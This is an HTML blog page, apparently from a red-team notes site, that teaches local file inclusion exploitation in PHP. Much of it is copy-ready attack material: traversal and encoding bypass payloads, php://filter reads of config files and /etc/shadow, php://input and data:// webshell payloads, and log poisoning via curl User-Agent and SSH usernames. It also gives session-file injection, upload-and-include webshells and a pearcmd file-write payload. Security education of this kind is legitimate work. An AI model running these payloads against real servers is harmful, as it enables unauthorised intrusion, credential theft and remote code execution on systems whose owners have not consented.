@@ -1,0 +1,2557 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <meta name="view-transition" content="same-origin">
+  <title>LFI — Local File Inclusion from First Principles — Axiom</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <script src="/axiom-blog-site/static/js/theme.js?v=1"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/style.css?v=37">
+  <link rel="stylesheet" href="/axiom-blog-site/cats.css">
+  <link rel="stylesheet" href="/axiom-blog-site/static/css/hljs.min.css?v=2">
+  <link rel="alternate" type="application/atom+xml" title="Axiom" href="/axiom-blog-site/feed.xml">
+  
+  
+  <script type="application/json" id="crypto-config">{"iterations": 200000, "salt": "Hs5vGSmGG9SrSvdivb1KMQ==", "validator": {"ciphertext": "qc5l/aTsWWRNo4f5E4/mEvP5on0aI+iozmsqvajrAwNS", "iv": "HdtYEOAFH1dyaFcb"}}</script>
+
+</head>
+<body class="cat-context-notes">
+  <header class="site-header">
+    <div class="container">
+      <a href="/axiom-blog-site/" class="site-brand">
+        <span class="brand-name">Axiom</span>
+      </a>
+      <nav class="site-nav">
+        
+  <a href="/axiom-blog-site/" class="nav-back">
+    <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
+      <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
+    </svg>
+    All posts
+  </a>
+
+        <button class="search-trigger" id="themeToggle" aria-label="Toggle theme" title="Toggle theme">
+          <svg class="icon-sun" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="4"/>
+            <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/>
+          </svg>
+          <svg class="icon-moon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+          </svg>
+        </button>
+        <button class="search-trigger" id="searchTrigger" aria-label="Search posts" title="Search">
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+          </svg>
+        </button>
+      </nav>
+    </div>
+  </header>
+
+  
+  <div class="search-overlay" id="searchOverlay" aria-hidden="true" role="dialog" aria-modal="true" aria-label="Search">
+    <div class="search-backdrop" id="searchBackdrop"></div>
+    <div class="search-panel">
+      <div class="search-input-wrap">
+        <svg class="search-icon-inner" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+        </svg>
+        <input class="search-input" id="searchInput"
+               type="search"
+               placeholder="Search titles, tags, content…"
+               autocomplete="off"
+               spellcheck="false"
+               maxlength="100"
+               aria-label="Search posts">
+        <button class="search-close" id="searchClose" aria-label="Close search">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
+            <path d="M18 6 6 18M6 6l12 12"/>
+          </svg>
+        </button>
+      </div>
+      <div class="search-results" id="searchResults" role="listbox" aria-live="polite"></div>
+    </div>
+  </div>
+
+  
+  <div class="modal-backdrop" id="shortcutsModalBackdrop" hidden>
+    <div class="modal" id="shortcutsModal" role="dialog" aria-modal="true" aria-labelledby="shortcutsTitle">
+      <div class="modal-header">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+            <rect x="2" y="6" width="20" height="12" rx="2"/>
+            <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h12"/>
+          </svg>
+        </div>
+        <div>
+          <h2 class="modal-title" id="shortcutsTitle">Keyboard Shortcuts</h2>
+          <p class="modal-subtitle">Navigate this site faster.</p>
+        </div>
+      </div>
+      <div class="modal-body">
+        <div class="shortcuts-list">
+          <div class="shortcuts-row">
+            <span>Open search</span>
+            <span class="shortcuts-keys"><span class="key">/</span><span class="key">s</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Close dialog</span>
+            <span class="shortcuts-keys"><span class="key">Esc</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Go home</span>
+            <span class="shortcuts-keys"><span class="key">g</span><span class="key">h</span></span>
+          </div>
+          <div class="shortcuts-row">
+            <span>Show this help</span>
+            <span class="shortcuts-keys"><span class="key">?</span></span>
+          </div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn btn-ghost" id="shortcutsClose">Close</button>
+      </div>
+    </div>
+  </div>
+
+  <main class="site-main">
+    <div class="container">
+      
+
+<div id="readingProgress" hidden></div>
+
+<article class="post-article has-toc cat-context-notes">
+
+  <div class="post-main">
+
+  <header class="post-header">
+    <h1 class="post-title">LFI — Local File Inclusion from First Principles</h1>
+    <div class="post-meta">
+      <time>2026-06-04</time>
+      
+        <span class="meta-sep">·</span>
+        <span class="reading-time">7 min read</span>
+      
+      
+        <span class="meta-sep">·</span>
+        <a href="/axiom-blog-site/cat/notes/" class="cat-badge cat-badge-link cat-notes">Notes</a>
+      
+      
+        <span class="meta-sep">·</span>
+        <span class="tag-list">
+          
+            <span class="tag">lfi</span>
+          
+            <span class="tag">web</span>
+          
+            <span class="tag">php</span>
+          
+            <span class="tag">path-traversal</span>
+          
+            <span class="tag">rce</span>
+          
+            <span class="tag">red-team</span>
+          
+            <span class="tag">notes</span>
+          
+        </span>
+      
+    </div>
+    
+      <p class="post-summary">How local file inclusion works, every PHP wrapper, log poisoning, /proc tricks, path traversal filters, LFI-to-RCE paths, sensitive files on Linux and Windows, and a full exploitation methodology.</p>
+    
+  </header>
+
+  
+  
+
+
+  <div class="post-body">
+    
+
+      
+        <div class="block text-block"><p>Local File Inclusion is one of those vulnerabilities that looks simple — you swap a filename in a URL — but the exploitation depth is enormous. From reading <code>/etc/passwd</code> all the way to a full shell, the attack surface is determined by the server's configuration, the application's context, and how creative you get with what you feed the include function.</p>
+<p>This guide covers LFI from the mechanics up through every reliable code-execution path, with the filter bypasses and file targets that matter in real engagements.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">01</span>
+            <span class="heading-text">What Is File Inclusion?</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>File inclusion vulnerabilities arise when a web application takes user-controlled input and passes it to a function that reads or executes a file. In PHP — still the most common context — those functions are:</p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Function</th><th>Executes PHP?</th><th>Output</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`include()`</td><td>Yes</td><td>Outputs content, warns on failure</td>
+                </tr>
+              
+                <tr>
+                  <td>`include_once()`</td><td>Yes</td><td>Same, but only once</td>
+                </tr>
+              
+                <tr>
+                  <td>`require()`</td><td>Yes</td><td>Fatal error on failure</td>
+                </tr>
+              
+                <tr>
+                  <td>`require_once()`</td><td>Yes</td><td>Same, but only once</td>
+                </tr>
+              
+                <tr>
+                  <td>`file_get_contents()`</td><td>No</td><td>Returns content as string</td>
+                </tr>
+              
+                <tr>
+                  <td>`fopen()` / `readfile()`</td><td>No</td><td>Reads bytes, no execution</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The critical distinction: <code>include()</code> and <code>require()</code> <strong>execute PHP code</strong> inside the included file. <code>file_get_contents()</code> just returns bytes. This distinction determines whether you can reach RCE.</p>
+<p><strong>Classic vulnerable pattern:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">php</span>
+            
+          </div>
+          <pre><code class="language-php">&lt;?php
+$page = $_GET[&#39;page&#39;];
+include($page . &#39;.php&#39;);
+?&gt;</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The developer intended: <code>?page=about</code> → includes <code>about.php</code>. You supply: <code>?page=../../../../etc/passwd</code> → includes the passwd file. The <code>.php</code> extension appended by code is a complication we'll deal with.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">02</span>
+            <span class="heading-text">Path Traversal Basics</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><code>../</code> is the traversal sequence — each <code>../</code> moves one directory up toward the filesystem root. Stack enough of them and you escape the web root.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">Document root: /var/www/html/
+Vulnerable include: include(&#39;/var/www/html/&#39; . $page . &#39;.php&#39;)
+
+Payload: ../../../../etc/passwd
+Result:  include(&#39;/var/www/html/../../../../etc/passwd.php&#39;)
+         resolves to: include(&#39;/etc/passwd.php&#39;)</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>If there's no extension append, it resolves cleanly to <code>/etc/passwd</code>.</p>
+<p><strong>How many <code>../</code> do you need?</strong> You can't go above <code>/</code> — extra traversals are silently ignored. Start with <code>../../../../../</code> (6 deep). The worst case is a web root sitting at <code>/var/www/html/app/module/pages/</code> (4 levels deep) so 6 always gets you to root.</p>
+<p><strong>Linux vs Windows:</strong><br>
+- Linux: <code>../</code> and <code>..%2F</code><br>
+- Windows: <code>..\</code>, <code>..\/</code>, <code>..%2F</code>, <code>..%5C</code> all work. Windows is also case-insensitive for paths.</p>
+<p><strong>URL encoding traversal:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block table-wrap">
+          <table class="table-block">
+            <thead>
+              <tr>
+                <th>Bypass</th><th>Encoding</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+                <tr>
+                  <td>`../`</td><td>`%2e%2e%2f`</td>
+                </tr>
+              
+                <tr>
+                  <td>`../`</td><td>`%2e%2e/`</td>
+                </tr>
+              
+                <tr>
+                  <td>`../`</td><td>`..%2f`</td>
+                </tr>
+              
+                <tr>
+                  <td>`..\`</td><td>`%2e%2e%5c`</td>
+                </tr>
+              
+                <tr>
+                  <td>Double URL encode</td><td>`%252e%252e%252f`</td>
+                </tr>
+              
+            </tbody>
+          </table>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">03</span>
+            <span class="heading-text">Filter Bypass Techniques</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Most real applications run some kind of sanitisation. Here's how developers typically implement it and how each can be bypassed.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Stripping `../`</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">php</span>
+            
+          </div>
+          <pre><code class="language-php">$page = str_replace(&#39;../&#39;, &#39;&#39;, $_GET[&#39;page&#39;]);</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>This replaces <code>../</code> with nothing — but only once per pass. If you double it up, the stripping leaves a new <code>../</code>:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">....//  →  strip ../  →  ../
+....//....//  →  ../../</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Use <code>....//</code> instead of <code>../</code> everywhere.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Extension Appending (no null byte in PHP ≥ 5.3)</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Old PHP (≤ 5.3) allowed a null byte <code>%00</code> to terminate string processing:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=../../../../etc/passwd%00
+→ include(&#39;/etc/passwd&#39;) + [ignored]</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>This <strong>does not work in modern PHP</strong> (5.3.4+ fixed). If you encounter it in CTFs it signals a very old target.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Fixed Extension — Using PHP Wrappers Instead</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>When the code appends <code>.php</code> and you can't use null bytes, PHP stream wrappers bypass the issue entirely. See the PHP Wrappers section below.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Path Length Truncation (very old PHP)</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>PHP on some old configurations truncated filenames at 4096 characters:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=../../../../etc/passwd/./././././[... 4096 chars total ...]</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The <code>.php</code> gets cut off. Largely theoretical on modern systems.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Double Encoding</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Some WAFs or filters URL-decode once then check. Double-encode:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">%252e%252e%252f  → (decode once) → %2e%2e%2f → (app decodes) → ../</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Absolute Path When No Prefix Is Added</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>If the application just does <code>include($_GET['page'])</code> with no path prefix, try absolute paths:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=/etc/passwd
+?page=/var/www/html/config.php</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">04</span>
+            <span class="heading-text">PHP Stream Wrappers</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>PHP's stream wrapper system is the most powerful LFI escalation primitive. Wrappers are URI-scheme prefixes that change how PHP reads a "file". They work with <code>include()</code>, <code>file_get_contents()</code>, and most file-related functions.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">`php://filter` — Read Source Code Without Execution</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>This is the most important wrapper for LFI. It lets you read PHP source code as base64 instead of having it executed:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=php://filter/convert.base64-encode/resource=index.php
+?page=php://filter/read=convert.base64-encode/resource=config.php
+?page=php://filter/convert.base64-encode/resource=../config/database.php</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The output is a base64 blob. Decode it locally:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">echo &#39;PD9waHAgJGRiX3Bhc3N3b3...&#39; | base64 -d &gt; config.php
+cat config.php</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>This reveals hardcoded credentials, API keys, database passwords, and the full application logic — all gold for an engagement.</p>
+<p><strong>Reading arbitrary files (no extension issue):</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=php://filter/convert.base64-encode/resource=/etc/passwd
+?page=php://filter/resource=/etc/shadow</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">`php://input` — Execute Arbitrary PHP</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>When <code>allow_url_include=On</code> (often off by default but misconfigured), you can POST raw PHP code and have it executed:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">curl -X POST &#39;http://target/index.php?page=php://input&#39; \
+  --data &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Then: <code>?page=php://input&amp;cmd=id</code></p>
+<p>Or in one request:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">curl -X POST &#39;http://target/index.php?page=php://input&amp;cmd=id&#39; \
+  --data &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">`data://` — Inline Data as PHP</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Also requires <code>allow_url_include=On</code>:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=data://text/plain,&lt;?php system(&#39;id&#39;); ?&gt;
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Base64 version avoids issues with special characters in the URL.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">`expect://` — Direct Command Execution</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Requires the <code>expect</code> PHP extension (rare but occasionally installed):</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=expect://id
+?page=expect://whoami</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">`zip://` and `phar://` — Include Files From Archives</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>If you can upload a file (even if the server renames it), you can package PHP inside a ZIP or PHAR and include it:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash"># Create a PHP webshell inside a zip
+echo &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; &gt; shell.php
+zip shell.zip shell.php
+# Upload shell.zip to the server (e.g., as an avatar)</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Then:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=zip:///var/www/html/uploads/shell.zip#shell
+?page=phar:///var/www/html/uploads/shell.zip/shell.php</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The <code>#shell</code> refers to the file inside the archive (without <code>.php</code> extension).</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">`file://` — Explicit File Read</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=file:///etc/passwd
+?page=file:///C:/Windows/win.ini</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Useful when the application strips <code>../</code> but not the <code>file://</code> scheme.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">05</span>
+            <span class="heading-text">LFI to RCE: Log Poisoning</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Log poisoning is the classic LFI-to-RCE technique when wrappers are unavailable. The idea: inject PHP code into a log file, then include the log file.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Apache Access Log</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Step 1 — Inject PHP into the User-Agent:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">curl -A &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; http://target/</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Apache logs every request including the User-Agent. The line in <code>/var/log/apache2/access.log</code> now contains raw PHP code.</p>
+<p><strong>Step 2 — Include the log:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?page=../../../../var/log/apache2/access.log&amp;cmd=id</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Apache executes the PHP when it includes the file. Output appears inline with the log content.</p>
+<p><strong>Common Apache/Nginx log locations:</strong></p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/var/log/httpd/access_log          (CentOS/RHEL)
+/var/log/httpd/error_log
+/proc/self/fd/1                    (stdout — sometimes works)
+/proc/self/fd/2                    (stderr)</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">SSH Auth Log</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>SSH logs authentication attempts including usernames. The username field is logged — inject PHP there:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">ssh &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39;@target
+# (connection will fail — that&#39;s fine, just need the log entry)</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Then: <code>?page=../../../../var/log/auth.log&amp;cmd=id</code></p>
+<p>Auth log locations:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">/var/log/auth.log        (Debian/Ubuntu)
+/var/log/secure          (CentOS/RHEL)</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">`/proc/self/environ`</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The <code>/proc/self/environ</code> pseudo-file contains the environment variables of the current process (Apache/PHP). The HTTP_USER_AGENT and other request headers appear here.</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">bash</span>
+            
+          </div>
+          <pre><code class="language-bash">curl -A &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; &#39;http://target/?page=../../../../proc/self/environ&amp;cmd=id&#39;</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>This works when <code>/proc/self/environ</code> is readable by the web server process (common on misconfigured servers).</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Email/Mail Logs</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>If the server has a mail service and you can send email to a local user:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">/var/mail/www-data
+/var/spool/mail/www-data</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Send a PHP payload as the mail body, then include the mail spool file.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Session Files</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>PHP stores session data in files. If you can control session variable values, inject PHP there:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">/var/lib/php/sessions/sess_[SESSIONID]
+/tmp/sess_[SESSIONID]
+/var/lib/php5/sessions/sess_[SESSIONID]</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>If the application stores user-supplied data in a session variable:</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">php</span>
+            
+          </div>
+          <pre><code class="language-php">$_SESSION[&#39;username&#39;] = $_GET[&#39;user&#39;];  // vulnerable</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Set your username to <code>&lt;?php system($_GET["cmd"]); ?&gt;</code>, find your session ID from the <code>PHPSESSID</code> cookie, then include <code>/var/lib/php/sessions/sess_YOURSESSID</code>.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">06</span>
+            <span class="heading-text">LFI to RCE: Other Paths</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Upload + Include</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>The most reliable RCE path when file upload exists anywhere on the application:</p>
+<ol>
+<li>Find a file upload endpoint (avatar, profile photo, document upload, etc.)</li>
+<li>Upload a PHP webshell disguised with a permitted extension: <code>shell.jpg</code> containing <code>&lt;?php system($_GET['cmd']); ?&gt;</code></li>
+<li>Determine the upload path (often disclosed in the response, HTML, or via directory listing)</li>
+<li>Include it: <code>?page=../../../../var/www/html/uploads/shell.jpg</code></li>
+</ol>
+<p>The extension doesn't matter to <code>include()</code> — it executes PHP regardless.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Temp File Race (PHP + `/tmp`)</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>PHP stores uploaded files temporarily in <code>/tmp/phpXXXXXX</code> during the request. In a multipart file upload, you can:<br>
+1. Upload a file containing PHP<br>
+2. Simultaneously include <code>/tmp/phpXXXXXX</code> during the upload window</p>
+<p>This is a race condition and unreliable, but tools like <code>phpggc</code> automate it. Mostly CTF-relevant.</p></div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-3">
+          <h3 class="section-heading">
+            
+            <span class="heading-text">Pearcmd (Docker + PHP CLI)</span>
+          </h3>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>A more modern technique abusing <code>pearcmd.php</code> (installed with PHP CLI in many Docker images):</p></div>
+
+      
+    
+
+      
+        <div class="block api-code-block">
+          <div class="code-header">
+            <span class="lang-badge">text</span>
+            
+          </div>
+          <pre><code class="language-text">?+config-create+/&amp;page=/usr/local/lib/php/pearcmd&amp;/&lt;?php system($_GET[&#39;cmd&#39;])?&gt;+/tmp/shell.php</code></pre>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p>Creates <code>/tmp/shell.php</code>, then include it. Detailed in HackTricks — relevant for Dockerised PHP apps.</p></div>
+
+      
